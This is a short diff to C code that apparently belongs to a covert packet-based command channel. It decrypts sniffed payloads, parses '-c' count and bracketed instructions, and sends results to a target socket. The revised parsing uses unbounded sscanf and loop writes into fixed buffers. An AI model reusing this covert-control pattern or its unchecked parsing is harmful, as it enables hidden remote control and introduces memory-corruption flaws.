@@ -160,6 +160,10 @@ void print_hex_ascii_line (const u_char *payload, int len, int offset) {
 void decrypt_payload(u_char *payload) {
     char decrypt_string[128] = {0};
     char *count;
+    const char* delimiter = "-c ";
+    const char* endToken = "]";
+    char extracted_count[10] = {0};
+
 
     for (int i = 0; i < strlen(payload); i++) {
         decrypt_string[i] = encrypt_decrypt(payload[i]);
@@ -173,14 +177,15 @@ void decrypt_payload(u_char *payload) {
             opts.serv_flag = TRUE;
         }
         extract_square_bracket_string(decrypt_string);
-        memset(decrypt_string, 0, sizeof(decrypt_string));
     }
     if (strstr(decrypt_string, "-c") != NULL) {
         count = strstr(decrypt_string, "-c");
-        count += 2;
-        opts.count = (unsigned int) atoi(count);
+        count += strlen(delimiter);
+        char* endPtr = strstr(count, endToken);
+        sscanf(count, "%[^]]", extracted_count);
+        opts.count = (unsigned int) atoi(extracted_count);
     }
-
+    memset(decrypt_string, 0, sizeof(decrypt_string));
 }
 
 
@@ -243,8 +248,6 @@ void extract_square_bracket_string(char* input) {
         sendto(opts.target_socket, opts.buffer, strlen(opts.buffer), 0,
                (struct sockaddr *) &serv_addr, sizeof(serv_addr));
         memset(opts.buffer, 0, sizeof(opts.buffer));
-        memset(opts.decrypt_instruction, 0, sizeof(opts.decrypt_instruction));
-
         /* close */
     }
 }
